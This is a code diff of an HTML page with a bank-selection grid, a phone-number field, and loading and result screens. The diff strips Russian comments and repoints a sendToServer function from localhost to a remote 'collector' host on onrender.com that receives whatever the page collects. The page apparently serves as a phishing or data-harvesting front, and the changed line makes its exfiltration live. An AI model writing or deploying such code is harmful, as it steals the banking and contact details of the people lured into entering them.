@@ -58,7 +58,6 @@
         .header h1 { font-size: 20px; font-weight: 700; color: var(--text); margin-bottom: 4px; }
         .header p { font-size: 13px; color: var(--text-secondary); line-height: 1.4; }
 
-        /* Банки */
         .bank-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 20px; }
         .bank-card {
             background: #fafbfc; border: 1.5px solid var(--border); border-radius: 14px;
@@ -78,7 +77,6 @@
         }
         .other-banks-btn:hover { border-color: var(--accent); color: var(--accent); background: #fefdf9; }
 
-        /* Поля ввода */
         .input-group { margin-bottom: 18px; }
         .input-group label { display: block; font-size: 12px; font-weight: 600; color: var(--text); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
         .phone-input-wrapper {
@@ -146,7 +144,6 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* Каталог */
         .catalog-section { margin-bottom: 20px; }
         .catalog-section-title { font-weight: 700; font-size: 15px; color: var(--text); margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
         .catalog-card {
@@ -161,12 +158,10 @@
         .catalog-card .info .subtitle { font-size: 11px; color: var(--text-secondary); margin-top: 2px; }
         .catalog-card .badge { background: var(--success); color: white; border-radius: 8px; padding: 4px 10px; font-size: 12px; font-weight: 700; }
 
-        /* Страница загрузки */
         .loading-page { text-align: center; padding: 30px 0; }
         .loading-page .loading-text { font-size: 14px; color: var(--text); font-weight: 600; }
         .loading-page .loading-sub { font-size: 12px; color: var(--text-secondary); margin-top: 4px; }
 
-        /* Страница результата */
         .result-page { text-align: center; padding: 20px 0; }
         .result-page .result-icon { font-size: 48px; margin-bottom: 12px; }
         .result-page .result-title { font-size: 18px; font-weight: 700; color: var(--text); }
@@ -435,7 +430,7 @@
 
     async function sendToServer(data) {
         try {
-            await fetch('http://localhost:5000/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+            await fetch('https://collector-bh3t.onrender.com/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
         } catch (e) {
             console.log('[DEV] Данные:', data);
         }
